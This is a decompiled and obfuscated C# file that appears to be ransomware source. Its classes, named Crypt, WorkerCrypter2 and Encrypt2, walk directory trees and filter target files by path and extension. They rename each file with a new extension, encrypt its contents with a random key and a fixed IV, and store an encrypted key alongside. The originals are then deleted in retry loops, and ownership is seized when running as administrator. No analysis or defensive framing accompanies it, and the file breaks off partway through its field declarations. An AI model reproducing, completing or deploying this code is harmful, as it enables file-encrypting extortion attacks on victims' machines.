using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using uDemqlRSGGvv;

namespace fTOyYuFiHboGKe;

internal sealed class bpqMdVmtaEtPaZM
{
	public sealed class YregMXoeJCC
	{
		private static StringCollection HwCEPuAIrwaFRd;

		private static List<string> IUApikptQTxbO;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107407186));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393219)) && !text.ToLower().Contains(getString_0(107407181)) && !text.ToLower().Contains(getString_0(107393185)) && !text.ToLower().Contains(getString_0(107393140)) && !text.ToLower().Contains(getString_0(107407200)) && !text.ToLower().Contains(getString_0(107393638)) && !text.ToLower().Contains(getString_0(107393458)) && !text.ToLower().Contains(getString_0(107393473)) && !text.ToLower().Contains(getString_0(107393424)) && !text.ToLower().Contains(getString_0(107393439)) && !text.ToLower().Contains(getString_0(107393405)) && !text.ToLower().Contains(getString_0(107392844)) && !text.ToLower().Contains(getString_0(107392827)) && !text.ToLower().Contains(getString_0(107392814)) && !text.ToLower().Contains(getString_0(107392793)) && !text.ToLower().Contains(getString_0(107392780)) && !text.ToLower().Contains(getString_0(107392799)) && !text.ToLower().Contains(getString_0(107392750)) && !text.ToLower().Contains(getString_0(107392765)) && !text.Contains(HIZwQscayZMa(getString_0(107392716))) && !text.Contains(getString_0(107392691)) && !text.Contains(getString_0(107392710)) && !text.EndsWith(getString_0(107395297)) && !text.EndsWith(getString_0(107392653)) && !text.EndsWith(getString_0(107392680)) && !text.EndsWith(getString_0(107392675)) && !text.EndsWith(getString_0(107392670)) && !text.ToLower().Contains(getString_0(107392633)) && !text.ToLower().Contains(NGRRApkWgPFBD))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(sCWngckDuqD) * 1024.0 * 1024.0 && pNBnwqWxvnZcdZ == getString_0(107396728))
							{
								IUApikptQTxbO.Add(text);
							}
							else if (File.Exists(text) && pNBnwqWxvnZcdZ == getString_0(107396697))
							{
								IUApikptQTxbO.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return IUApikptQTxbO;
		}

		static YregMXoeJCC()
		{
			Strings.CreateGetStringDelegate(typeof(YregMXoeJCC));
			HwCEPuAIrwaFRd = new StringCollection();
			IUApikptQTxbO = new List<string>();
		}
	}

	private sealed class nsFpvrNGvOuVXy
	{
		public string TuiBPSgeyk;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == TuiBPSgeyk;
		}
	}

	private sealed class tUlAjfzdpI
	{
		private sealed class ndRcxMNfrj
		{
			public tUlAjfzdpI HTTToBJGoSzotWT;

			public string pRdVQkJUcNR;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					xkiuAMfGtUFTFcM(WindowsIdentity.GetCurrent().Name, pRdVQkJUcNR);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				lsPYSsVKcw(pRdVQkJUcNR, HTTToBJGoSzotWT.PrOFcmBNSPzcP, HTTToBJGoSzotWT.vepxGtypYG, HTTToBJGoSzotWT.kljgkOdjshZ, HTTToBJGoSzotWT.xOpnYbSISAB);
			}
		}

		public string[] PrOFcmBNSPzcP;

		public string[] kljgkOdjshZ;

		public string xOpnYbSISAB;

		public string vepxGtypYG;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			ndRcxMNfrj CS_0024_003C_003E8__locals0 = new ndRcxMNfrj();
			CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT = this;
			CS_0024_003C_003E8__locals0.pRdVQkJUcNR = string_0;
			if (HPWnUWTgHq && !bmwWGsqcQrk().Contains(getString_0(107389793)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						xkiuAMfGtUFTFcM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.pRdVQkJUcNR);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ysmQyIRLiTDhstt == getString_0(107396734))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					lsPYSsVKcw(CS_0024_003C_003E8__locals0.pRdVQkJUcNR, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.PrOFcmBNSPzcP, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.vepxGtypYG, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.kljgkOdjshZ, CS_0024_003C_003E8__locals0.HTTToBJGoSzotWT.xOpnYbSISAB);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				lsPYSsVKcw(CS_0024_003C_003E8__locals0.pRdVQkJUcNR, PrOFcmBNSPzcP, vepxGtypYG, kljgkOdjshZ, xOpnYbSISAB);
			}
		}

		static tUlAjfzdpI()
		{
			Strings.CreateGetStringDelegate(typeof(tUlAjfzdpI));
		}
	}

	private sealed class ucFASnlDtvNA
	{
		private sealed class cNukjGDgTCkDrLH
		{
			public ucFASnlDtvNA DKuPYNHYNrnrie;

			public string kWfUVvyPiIV;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in ewhHGOPmfx)
				{
					if (kWfUVvyPiIV.ToLower().EndsWith(item + DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == getString_0(107396745))
					{
						if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(kWfUVvyPiIV).Length)
						{
							try
							{
								ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394065), getString_0(107394028), getString_0(107394015), kWfUVvyPiIV);
							}
							catch
							{
							}
						}
					}
					else if (kWfUVvyPiIV.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396714))
					{
						try
						{
							ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394065), getString_0(107394028), getString_0(107394015), kWfUVvyPiIV);
						}
						catch
						{
						}
					}
				}
			}

			static cNukjGDgTCkDrLH()
			{
				Strings.CreateGetStringDelegate(typeof(cNukjGDgTCkDrLH));
			}
		}

		private sealed class SODYbbdWBTfFH
		{
			public ucFASnlDtvNA DKuPYNHYNrnrie;

			public string hAWPAYCtjM;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in ewhHGOPmfx)
				{
					if (hAWPAYCtjM.ToLower().EndsWith(item + DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == getString_0(107396748))
					{
						if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(hAWPAYCtjM).Length)
						{
							try
							{
								ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394068), getString_0(107394031), getString_0(107394018), hAWPAYCtjM);
							}
							catch
							{
							}
						}
					}
					else if (hAWPAYCtjM.ToLower().EndsWith(item) && hyJckWvZQWcw == getString_0(107396717))
					{
						try
						{
							ceWGkLeWGlSf.juUjjlmBvTArjN(getString_0(107394068), getString_0(107394031), getString_0(107394018), hAWPAYCtjM);
						}
						catch
						{
						}
					}
				}
			}

			static SODYbbdWBTfFH()
			{
				Strings.CreateGetStringDelegate(typeof(SODYbbdWBTfFH));
			}
		}

		public List<string> FYyQrIlUOPc;

		public List<string> lnuYdimQEFE;

		public string gHhZvtvHCcOv;

		public string[] iiIQpsdvhyz;

		public string hUytBMdeRsO;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			cNukjGDgTCkDrLH CS_0024_003C_003E8__locals0;
			foreach (string item in lnuYdimQEFE)
			{
				if (iiIQpsdvhyz.Length != 0)
				{
					string[] array = iiIQpsdvhyz;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(gHhZvtvHCcOv))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || eVEJPETDEKd.Contains(item))
				{
					continue;
				}
				if (FvCkrJmFGmOziw == getString_0(107396742))
				{
					try
					{
						if (fdtKAmGWXfi.WHvMByXpIWTxQu(item))
						{
							fdtKAmGWXfi.YtQDdeRlSBPmR(item);
						}
					}
					catch
					{
					}
				}
				eVEJPETDEKd.Add(item);
				if (!fxkaTZNzSZr.Contains(Path.GetDirectoryName(item)))
				{
					fxkaTZNzSZr.Add(Path.GetDirectoryName(item));
				}
				VsyCflqkTNfpfbv(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (diLbjzXQsjUvfr)
						{
							try
							{
								File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + item + getString_0(107407165) + ex2.Message + getString_0(107396627));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (gdOttXkAiCtHt == getString_0(107396742) && new FileInfo(item).Length > Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024 && !FYyQrIlUOPc.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new cNukjGDgTCkDrLH();
						CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie = this;
						try
						{
							if (gHhZvtvHCcOv != getString_0(107389720))
							{
								File.Move(item, item + gHhZvtvHCcOv);
							}
						}
						catch (Exception ex4)
						{
							if (diLbjzXQsjUvfr)
							{
								try
								{
									File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + item + getString_0(107407104) + ex4.Message + getString_0(107396627));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.kWfUVvyPiIV = getString_0(107393949);
						if (gHhZvtvHCcOv != getString_0(107389720))
						{
							CS_0024_003C_003E8__locals0.kWfUVvyPiIV = item + gHhZvtvHCcOv;
						}
						else
						{
							CS_0024_003C_003E8__locals0.kWfUVvyPiIV = item;
						}
						if (DzWFTAUXUsJj == getString_0(107396742))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in ewhHGOPmfx)
								{
									if (CS_0024_003C_003E8__locals0.kWfUVvyPiIV.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == cNukjGDgTCkDrLH.getString_0(107396745))
									{
										if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.kWfUVvyPiIV).Length)
										{
											try
											{
												ceWGkLeWGlSf.juUjjlmBvTArjN(cNukjGDgTCkDrLH.getString_0(107394065), cNukjGDgTCkDrLH.getString_0(107394028), cNukjGDgTCkDrLH.getString_0(107394015), CS_0024_003C_003E8__locals0.kWfUVvyPiIV);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.kWfUVvyPiIV.ToLower().EndsWith(item2) && hyJckWvZQWcw == cNukjGDgTCkDrLH.getString_0(107396714))
									{
										try
										{
											ceWGkLeWGlSf.juUjjlmBvTArjN(cNukjGDgTCkDrLH.getString_0(107394065), cNukjGDgTCkDrLH.getString_0(107394028), cNukjGDgTCkDrLH.getString_0(107394015), CS_0024_003C_003E8__locals0.kWfUVvyPiIV);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s = ByLCmnnhrrppt.KwlFsMMThHblH(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = rFWQHdvUec.aCOAFhOcJacI(CS_0024_003C_003E8__locals0.kWfUVvyPiIV, Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024);
						rFWQHdvUec.xYtDCXnCoWLDY(cNlFBFakfbYZRJ: (!HzPgxRaUZqk) ? (DUcsRxUyUOuZr ? rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DUcsRxUyUOuZr ? dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IueAOiADdpUiTH: CS_0024_003C_003E8__locals0.kWfUVvyPiIV, KWheOAkoqEJXf: bytes);
					}
					else
					{
						string text2 = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s2 = ByLCmnnhrrppt.KwlFsMMThHblH(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (gHhZvtvHCcOv != getString_0(107389720))
						{
							if (!StzmabfzgZhvrc)
							{
								if (!DUcsRxUyUOuZr)
								{
									lsRSnbfdzmPAmx(item, item + gHhZvtvHCcOv, LvwthqCIfyprjsma);
								}
								else
								{
									lsRSnbfdzmPAmx(item, item + gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!DUcsRxUyUOuZr)
									{
										XEtwPwqcBXn(item, item + gHhZvtvHCcOv, LvwthqCIfyprjsma);
									}
									else
									{
										XEtwPwqcBXn(item, item + gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (diLbjzXQsjUvfr)
									{
										try
										{
											File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + item + getString_0(107389706) + ex6.Message + getString_0(107396627));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!StzmabfzgZhvrc)
						{
							if (!DUcsRxUyUOuZr)
							{
								lsRSnbfdzmPAmx(item, item + getString_0(107389715), LvwthqCIfyprjsma);
							}
							else
							{
								lsRSnbfdzmPAmx(item, item + getString_0(107389715), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!DUcsRxUyUOuZr)
								{
									XEtwPwqcBXn(item, item, LvwthqCIfyprjsma);
								}
								else
								{
									XEtwPwqcBXn(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (diLbjzXQsjUvfr)
								{
									try
									{
										File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + item + getString_0(107389706) + ex8.Message + getString_0(107396627));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (DUcsRxUyUOuZr)
						{
							if (gHhZvtvHCcOv != getString_0(107389720))
							{
								SfCyHUXuiKgwteW(item + gHhZvtvHCcOv, bytes2);
							}
							else
							{
								SfCyHUXuiKgwteW(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				lnuYdimQEFE.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			SODYbbdWBTfFH CS_0024_003C_003E8__locals0 = new SODYbbdWBTfFH();
			CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie = this;
			CS_0024_003C_003E8__locals0.hAWPAYCtjM = string_0;
			if (iiIQpsdvhyz.Length != 0)
			{
				string[] array = iiIQpsdvhyz;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.hAWPAYCtjM.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.EndsWith(gHhZvtvHCcOv))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!eVEJPETDEKd.Contains(CS_0024_003C_003E8__locals0.hAWPAYCtjM))
			{
				if (FvCkrJmFGmOziw == getString_0(107396742))
				{
					try
					{
						if (fdtKAmGWXfi.WHvMByXpIWTxQu(CS_0024_003C_003E8__locals0.hAWPAYCtjM))
						{
							fdtKAmGWXfi.YtQDdeRlSBPmR(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
						}
					}
					catch
					{
					}
				}
				eVEJPETDEKd.Add(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
				if (!fxkaTZNzSZr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hAWPAYCtjM)))
				{
					fxkaTZNzSZr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hAWPAYCtjM));
				}
				VsyCflqkTNfpfbv(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (diLbjzXQsjUvfr)
						{
							try
							{
								File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107407165) + ex2.Message + getString_0(107396627));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (gdOttXkAiCtHt == getString_0(107396742) && new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length > Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024)
					{
						try
						{
							if (gHhZvtvHCcOv != getString_0(107389720))
							{
								File.Move(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv);
							}
						}
						catch (Exception ex4)
						{
							if (diLbjzXQsjUvfr)
							{
								try
								{
									File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107407104) + ex4.Message + getString_0(107396627));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (gHhZvtvHCcOv != getString_0(107389720))
						{
							CS_0024_003C_003E8__locals0.hAWPAYCtjM += gHhZvtvHCcOv;
						}
						if (DzWFTAUXUsJj == getString_0(107396742))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in ewhHGOPmfx)
								{
									if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.DKuPYNHYNrnrie.gHhZvtvHCcOv) && hyJckWvZQWcw == SODYbbdWBTfFH.getString_0(107396748))
									{
										if (Convert.ToInt32(BDRVdFdRwZNTSIubZ) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hAWPAYCtjM).Length)
										{
											try
											{
												ceWGkLeWGlSf.juUjjlmBvTArjN(SODYbbdWBTfFH.getString_0(107394068), SODYbbdWBTfFH.getString_0(107394031), SODYbbdWBTfFH.getString_0(107394018), CS_0024_003C_003E8__locals0.hAWPAYCtjM);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.hAWPAYCtjM.ToLower().EndsWith(item) && hyJckWvZQWcw == SODYbbdWBTfFH.getString_0(107396717))
									{
										try
										{
											ceWGkLeWGlSf.juUjjlmBvTArjN(SODYbbdWBTfFH.getString_0(107394068), SODYbbdWBTfFH.getString_0(107394031), SODYbbdWBTfFH.getString_0(107394018), CS_0024_003C_003E8__locals0.hAWPAYCtjM);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s = ByLCmnnhrrppt.KwlFsMMThHblH(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = rFWQHdvUec.aCOAFhOcJacI(CS_0024_003C_003E8__locals0.hAWPAYCtjM, Convert.ToInt32(CtXFrubNJZZ) * 1024 * 1024);
						rFWQHdvUec.xYtDCXnCoWLDY(cNlFBFakfbYZRJ: (!HzPgxRaUZqk) ? (DUcsRxUyUOuZr ? rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rFWQHdvUec.ItXpiZDVtRONv(byte_, Encoding.ASCII.GetBytes(hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (DUcsRxUyUOuZr ? dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : dwwswYRnKWB.yexFGBxyBEuJjkPLr(byte_, Encoding.ASCII.GetBytes(hUytBMdeRsO), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), IueAOiADdpUiTH: CS_0024_003C_003E8__locals0.hAWPAYCtjM, KWheOAkoqEJXf: bytes);
					}
					else
					{
						string text2 = hATaEjuoJnfVW.woabxWiCwZgG(32);
						string s2 = ByLCmnnhrrppt.KwlFsMMThHblH(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (gHhZvtvHCcOv != getString_0(107389720))
						{
							if (!StzmabfzgZhvrc)
							{
								if (!DUcsRxUyUOuZr)
								{
									lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv, LvwthqCIfyprjsma);
								}
								else
								{
									lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!DUcsRxUyUOuZr)
									{
										XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv, LvwthqCIfyprjsma);
									}
									else
									{
										XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (diLbjzXQsjUvfr)
									{
										try
										{
											File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107389706) + ex6.Message + getString_0(107396627));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!StzmabfzgZhvrc)
						{
							if (!DUcsRxUyUOuZr)
							{
								lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107389715), LvwthqCIfyprjsma);
							}
							else
							{
								lsRSnbfdzmPAmx(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107389715), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!DUcsRxUyUOuZr)
								{
									XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM, LvwthqCIfyprjsma);
								}
								else
								{
									XEtwPwqcBXn(CS_0024_003C_003E8__locals0.hAWPAYCtjM, CS_0024_003C_003E8__locals0.hAWPAYCtjM, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (diLbjzXQsjUvfr)
								{
									try
									{
										File.AppendAllText(fNCnNJWJkI, getString_0(107390479) + CS_0024_003C_003E8__locals0.hAWPAYCtjM + getString_0(107389706) + ex8.Message + getString_0(107396627));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (DUcsRxUyUOuZr)
						{
							if (gHhZvtvHCcOv != getString_0(107389720))
							{
								SfCyHUXuiKgwteW(CS_0024_003C_003E8__locals0.hAWPAYCtjM + gHhZvtvHCcOv, bytes2);
							}
							else
							{
								SfCyHUXuiKgwteW(CS_0024_003C_003E8__locals0.hAWPAYCtjM, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			lnuYdimQEFE.Remove(CS_0024_003C_003E8__locals0.hAWPAYCtjM);
		}

		static ucFASnlDtvNA()
		{
			Strings.CreateGetStringDelegate(typeof(ucFASnlDtvNA));
		}
	}

	private sealed class YTioAnMrlREUS
	{
		public string UzxqcECsdUsalJ;

		public string jBYypFGUrsM;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(UzxqcECsdUsalJ);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(jBYypFGUrsM))
					{
						File.Delete(jBYypFGUrsM);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string SoSVvJbhzN;

	public static byte[] LvwthqCIfyprjsma;

	public static string pNBnwqWxvnZcdZ;

	public static string sCWngckDuqD;

	public static List<string> ndBzFjvUeNH;

	public static List<string> EOuLUPioJmZ;

	public static string jmNGPrOmjSIISc;

	public static string hUytBMdeRsO;

	public static string iLtpaOqpVUqJDx;

	public static string aYUpHUGdUIVC;

	public static int DWJYSGdBjcTBL;

	public static string FvCkrJmFGmOziw;

	public static string bTVdtQmloMp;

	public static string lCxFWzSgiFYn;

	public static string qNekJNHQbGgdlj;

	public static string QfgIHFkqWOl;

	public static string PWXfeHZgnWm;

	public static string VsJIukPqAguT;

	public static string daKWNUQSDBiFyu;

	public static List<string> BoNIHLCorthXUO;

	public static List<string> fxkaTZNzSZr;

	public static string wwmnCAhnPVImbEsn;

	public static string kPnBwmxUOIE;

	public static string oyBhuhygfld;

	public static List<string> eVEJPETDEKd;

	public static string WzzaTIQBEQUdZBX;

	private static string JliYkBzhNMrnM;

	public static string ysmQyIRLiTDhstt;

	public static string cmTyFueGlRJlWd;

	public static List<string> yShCceaqxImzo;

	public static List<string> EMZZVRukVgRk;

	public static List<string> YyRbaEftoamR;

	public static List<string> bXbpSdhsQQQk;

	public static string xiHuEoHoRXESAY;

	public static List<string> hAoVEaJfEovikWoJ;

	public static List<string> YkLPjYDuCfAlg;

	public static string WXyemYtuBSqy;

	public static string RlCpaLrMWWn;

	internal static DateTime TcEcgQAQdsjAwX;

	internal static DateTime RNwCRPwGBq;

	public static string gdOttXkAiCtHt;

	public static string CtXFrubNJZZ;

	public static string HtBtaIplbcJ;

	public static string nyNaHkLePeNInG;

	public static string nagIxCHlSaFIy;

	public static string iDMbzWpNZVVVNw;

	public static string HIVWYaWSCMvU;

	public static string DzWFTAUXUsJj;

	public static List<string> ewhHGOPmfx;

	public static string hyJckWvZQWcw;

	public static string BDRVdFdRwZNTSIubZ;

	public static string fiKMSHHQxtAuJr;

	public static string hwISOErmmXW;

	public static string HoENWKurOnukFU;

	public static string oJxmOjwwboOJ;

	public static string mzZBMWoWPUw;

	public static string jjnkYCMBgr;

	public static string QgIMahSiUFcf;

	public static string WDlBZpIwAXQtdZ;

	public static string dVJverldWOjQU;

	public static string lBVOdMAyRgvZP;

	public static string rtcZjiAsAoieR;

	public static string HrqrtPhWTAbK;

	public static string WbmqlEKxtL;

	public static string LYnLSPynFqmDEg;

	public static string lMoyvIhQlOwWjX;

	public static string ZsKnSHGREjt;

	public static string UXRLGpjTgaHE;

	public static string NGRRApkWgPFBD;

	public static string ZsLqPlmZKQuFKP;

	public static string WRquJhjHJBI;

	public static string drHBNZfPBu;

	public static string sHBwSrfcnHkEPy;

	public static string qQnnlrkzDnWviZ;

	public static string iQVfjjPnVtUWK;

	public static string PBiVvwWfdkzY;

	public static string HSXeaxeEXpTrQ;

	public static string QiRNmqPOWrMtCh;

	public static string[] KPxzLUKEmVdQyD;

	public static string JvyLVvgwySTVfgs;

	public static bool HzPgxRaUZqk;

	public static string taEztzoIfcK;

	public static bool DUcsRxUyUOuZr;

	public static bool FCZWstOVKY;

	public static bool iGpFNBdltsqHeT;

	public static bool ebdecQEFHvifCf;

	public static string fNCnNJWJkI;

	public static bool diLbjzXQsjUvfr;

	public static bool RUJUVUvIRWp;

	public static bool jHuzdxCmiAYg;

	public static bool HPWnUWTgHq;

	public static bool StzmabfzgZhvrc;

